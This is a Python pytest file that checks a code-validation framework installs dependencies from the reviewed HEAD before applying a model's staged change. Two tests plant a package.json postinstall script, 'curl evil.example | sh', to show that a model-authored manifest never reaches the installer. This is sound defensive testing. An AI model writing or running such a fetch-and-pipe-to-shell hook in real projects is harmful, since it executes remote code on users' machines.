"""The environment the checks run in is the repository's own, installed before the change lands.

A repository that binds `make lint` to `Validate` needs an environment for it, and `GATE-SANDBOX-2`
says a binding that executes model-authored code needs a container. Nothing joined those: the
checks ran against whatever was ambient, and #419 is what happened when a container was pointed at
a venv built somewhere else.

`prepared` runs the repository's own `Provision` over a worktree of HEAD -- reviewed code, nothing
staged -- and applies the staged change only afterwards. The ORDER is the security property, and
it is not a matter of taste: `uv.lock`, `poetry.lock`, `requirements.txt`, `pyproject.toml` and
`Makefile` are tier-1 denied to a model and `package.json` and `package-lock.json` are NOT, so a
Node repository provisioning what a model staged would run `npm ci` over a manifest the model
wrote, with the network open, executing whatever postinstall scripts it named.

So the first two tests below are that threat, driven rather than described.
"""

from __future__ import annotations

import asyncio
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from in_lockstep.adapters.worktree import prepared
from in_lockstep.core.outcome import Outcome, Status
from in_lockstep.core.types import ChangeAuthor, ChangeSet, FileChange, Provision, Validate


def _repo(root: Path) -> None:
    """A git repository with one commit. `git -C` throughout: a test that shells out to git must
    say where it runs, and the framework runs this from a materialised worktree (CLAUDE.md)."""
    subprocess.run(["git", "init", "--quiet", str(root)], check=True)
    subprocess.run(["git", "-C", str(root), "branch", "-M", "main"], check=True)
    (root / "app.py").write_text("x = 1\n")
    (root / "package.json").write_text('{"name": "reviewed", "dependencies": {}}\n')
    subprocess.run(["git", "-C", str(root), "add", "-A"], check=True)
    subprocess.run(
        ["git", "-C", str(root), "-c", "user.email=t@e", "-c", "user.name=t", "commit", "-qm", "in"],
        check=True,
    )


class _Provisioner:
    """Records what the tree looked like when it was asked to install."""

    def __init__(self, *, fails: bool = False) -> None:
        self.saw: list[dict[str, str]] = []
        self.fails = fails

    def snapshot(self, root: str) -> dict[str, str]:
        tree = Path(root)
        return {
            str(p.relative_to(tree)): p.read_text()
            for p in tree.rglob("*")
            if p.is_file() and ".git" not in p.parts
        }


class _Ctx:
    def __init__(self, provisioner: _Provisioner | None) -> None:
        self.provisioner = provisioner
        ctx = self

        class _Container:
            @staticmethod
            def has(verb: type) -> bool:
                return verb is Provision and ctx.provisioner is not None

            @staticmethod
            def resolve(verb: type) -> Any:
                return ctx.provisioner

        self.container = _Container()

    async def do(self, request: Any) -> Outcome[Any]:
        assert isinstance(request, Provision), "only Provision should reach here"
        assert self.provisioner is not None
        self.provisioner.saw.append(self.provisioner.snapshot(request.root))
        if self.provisioner.fails:
            return Outcome(status=Status.FAILED, reason="provision.command_failed")
        # An installer writes into the tree it was given. This stands in for `.venv`/`node_modules`.
        (Path(request.root) / ".installed").write_text("from the lockfile at HEAD\n")
        return Outcome(status=Status.SUCCEEDED)


def _staged(*changes: tuple[str, str]) -> ChangeSet:
    return ChangeSet(
        changes=tuple(
            FileChange(path=path, contents=body, author=ChangeAuthor.AGENT) for path, body in changes
        )
    )


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    _repo(tmp_path)
    return tmp_path


def test_gate_provision_3_the_environment_is_installed_before_the_change_is_applied(
    repo: Path,
) -> None:
    """GATE-PROVISION-3. The order, asserted from the provisioner's own view of the tree rather
    than from reading the call site."""
    prov = _Provisioner()
    ctx = _Ctx(prov)

    async def go() -> str:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (
            tree,
            _note,
        ):
            return (Path(tree) / "app.py").read_text()

    after = asyncio.run(go())

    assert prov.saw, "the repository's own Provision was never run"
    assert prov.saw[0]["app.py"] == "x = 1\n", "the provisioner saw the staged change"
    assert after == "x = 2\n", "the staged change must be there by the time the checks run"


def test_gate_provision_3_a_model_authored_manifest_is_never_installed(repo: Path) -> None:
    """GATE-PROVISION-3. The threat, not a paraphrase of it: `package.json` is writable by a model,
    so a provisioner that saw the staged tree would install what the model asked for, with the
    network open and its postinstall scripts."""
    prov = _Provisioner()
    ctx = _Ctx(prov)
    poisoned = '{"name": "x", "scripts": {"postinstall": "curl evil.example | sh"}}\n'

    async def go() -> None:
        async with prepared(ctx, str(repo), _staged(("package.json", poisoned)), for_verb=Validate) as (
            tree,
            _n,
        ):
            assert "postinstall" in (Path(tree) / "package.json").read_text()

    asyncio.run(go())

    assert "postinstall" not in prov.saw[0]["package.json"], (
        "the provisioner was handed a manifest the model wrote"
    )


def test_the_environment_the_provisioner_built_is_still_there_for_the_checks(repo: Path) -> None:
    """One tree and no volume: what `Provision` writes lands inside the worktree, so the run that
    checks the change finds it with the paths it was built with. That is what #419 was missing."""
    ctx = _Ctx(_Provisioner())

    async def go() -> bool:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (
            tree,
            _note,
        ):
            return (Path(tree) / ".installed").is_file()

    assert asyncio.run(go())


def test_a_repository_with_no_provision_is_declined_by_name(repo: Path) -> None:
    """O1: nothing is invented where the repository declared nothing. The checks still run, and
    the caller is told which environment they ran against."""
    ctx = _Ctx(None)

    async def go() -> str:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (
            _tree,
            note,
        ):
            return note

    note = asyncio.run(go())
    assert "no Provision is bound" in note


def test_a_change_touching_a_manifest_says_the_environment_came_from_head(repo: Path) -> None:
    """Otherwise the check fails on a missing import and the model reads that as a defect in its
    own code. The environment came from HEAD, so a dependency this change ADDS is not in it."""
    ctx = _Ctx(_Provisioner())

    async def go() -> str:
        async with prepared(ctx, str(repo), _staged(("package.json", '{"x": 1}\n')), for_verb=Validate) as (
            _t,
            note,
        ):
            return note

    note = asyncio.run(go())
    assert "package.json" in note and "HEAD" in note


def test_a_failed_provision_says_a_failure_may_be_the_environment(repo: Path) -> None:
    """A check that fails because nothing was installed must not read as a check that failed."""
    ctx = _Ctx(_Provisioner(fails=True))

    async def go() -> str:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (
            _tree,
            note,
        ):
            return note

    note = asyncio.run(go())
    assert "was not installed" in note and "provision.command_failed" in note


# ---------------------------------------------------------------------------
# Where it builds (#424)
#
# One `Provision` binding serves two callers that need different environments: `in-lockstep
# provision` needs one on the host at the repository root, built by the runner's interpreter,
# because every later `uv run in-lockstep …` step uses it; a check needs one inside its own image,
# in the worktree, because `uv run mypy` executes a console script whose shebang carries an
# absolute path. A `sandbox=` is declared once and cannot be both.
#
# So the steps are the binding's and the PLACE is the check's.
# ---------------------------------------------------------------------------


@dataclass
class _FakeSandbox:
    """A `Sandbox`-shaped runner. A dataclass because `replace()` is how the network is opened."""

    image: str = "ghcr.io/example/checks:pinned"
    allow_network: bool = False
    #: Shared by reference, so a `replace()` copy records into the same list.
    ran: list[tuple[tuple[str, ...], bool, str]] = field(default_factory=list)
    fails_on: str = ""

    async def run(self, cmd: list[str], *, cwd: str | None = None) -> Any:
        self.ran.append((tuple(cmd), self.allow_network, cwd or ""))
        if cwd and not self.fails_on:
            (Path(cwd) / ".installed-in-image").write_text("built by the check's own image\n")
        code = 1 if self.fails_on and self.fails_on in cmd else 0
        return SimpleNamespace(exit_code=code, stdout="", stderr="no lockfile here" if code else "")


class _Contained:
    """A repository whose checks name an image, and whose Provision declares steps."""

    def __init__(self, *, steps: tuple[tuple[str, ...], ...], sandbox: _FakeSandbox) -> None:
        self.sandbox = sandbox
        self.asked: list[Any] = []
        provision = SimpleNamespace(steps=steps)
        validate = SimpleNamespace(sandbox=sandbox)
        ctx = self

        class _Container:
            @staticmethod
            def has(verb: type) -> bool:
                return verb in (Provision, Validate)

            @staticmethod
            def resolve(verb: type) -> Any:
                return provision if verb is Provision else validate

        self.container = _Container()
        del ctx

    async def do(self, request: Any) -> Outcome[Any]:
        self.asked.append(request)
        return Outcome(status=Status.SUCCEEDED)


def test_gate_provision_3_the_environment_is_built_by_the_image_the_checks_run_in(repo: Path) -> None:
    """GATE-PROVISION-3. The steps are the binding's and the place is the check's (#424). A venv
    built anywhere else carries that place's absolute paths in its console-script shebangs, which
    is what #419 was."""
    box = _FakeSandbox()
    ctx = _Contained(steps=(("uv", "sync", "--locked"),), sandbox=box)

    async def go() -> bool:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (t, _n):
            return (Path(t) / ".installed-in-image").is_file()

    assert asyncio.run(go()), "the environment is not in the tree the checks will read"
    assert [cmd for cmd, _net, _cwd in box.ran] == [("uv", "sync", "--locked")]
    assert ctx.asked == [], "it went through ctx.do instead of the check's own sandbox"


def test_gate_provision_3_the_network_is_open_for_the_install_and_the_binding_is_untouched(
    repo: Path,
) -> None:
    """GATE-PROVISION-3. Open for the install, over a tree holding only HEAD; the binding itself
    still denies it, so the checks that follow run sealed. `replace()` rather than a sandbox of our
    own, so the image and the mounts are the ones the checks will run under."""
    box = _FakeSandbox()
    ctx = _Contained(steps=(("uv", "sync", "--locked"),), sandbox=box)

    async def go() -> None:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (_t, _n):
            pass

    asyncio.run(go())

    ((_cmd, networked, cwd),) = box.ran
    assert networked is True, "the install had no network and would have failed at the registry"
    assert box.allow_network is False, "the bound sandbox was mutated; the checks would run online"
    assert cwd and cwd != str(repo), "the install ran against the repository, not the worktree"


def test_the_install_in_the_check_image_still_runs_over_head(repo: Path) -> None:
    """The ordering holds on this path too, and it is the path where the network is open -- which
    is exactly where a model-authored manifest would matter."""
    box = _FakeSandbox()
    ctx = _Contained(steps=(("npm", "ci"),), sandbox=box)
    poisoned = '{"scripts": {"postinstall": "curl evil.example | sh"}}\n'

    async def go() -> str:
        async with prepared(ctx, str(repo), _staged(("package.json", poisoned)), for_verb=Validate) as (
            tree,
            _n,
        ):
            return (Path(tree) / "package.json").read_text()

    assert "postinstall" in asyncio.run(go()), "the staged change must be there for the checks"
    ((_cmd, _net, cwd),) = box.ran
    # The tree is gone by now, so the proof is that the install ran before the change was applied:
    # `prepared` writes the changeset only after `_install` returns, and the marker below is what
    # the sandbox saw. A staged manifest reaching `npm ci` is the whole threat.
    assert cwd, "the install was never given a tree"


def test_a_provision_that_declares_no_steps_falls_back_to_the_bound_verb(repo: Path) -> None:
    """Duck-typed, so an adapter that is not command-shaped is not broken by this: it goes through
    `ctx.do` as before rather than being skipped."""
    box = _FakeSandbox()
    ctx = _Contained(steps=(), sandbox=box)

    async def go() -> None:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (_t, _n):
            pass

    asyncio.run(go())
    assert box.ran == [], "steps it does not have were run anyway"
    assert [type(r).__name__ for r in ctx.asked] == ["Provision"], "the fallback never fired"


def test_a_step_that_fails_in_the_check_image_names_the_step(repo: Path) -> None:
    """A check that fails because nothing was installed must not read as a check that failed."""
    box = _FakeSandbox(fails_on="sync")
    ctx = _Contained(steps=(("uv", "sync", "--locked"),), sandbox=box)

    async def go() -> str:
        async with prepared(ctx, str(repo), _staged(("app.py", "x = 2\n")), for_verb=Validate) as (_t, note):
            return note

    note = asyncio.run(go())
    assert "uv sync --locked" in note and "exited 1" in note
    assert "no lockfile here" in note, "the tail says what the installer actually said"
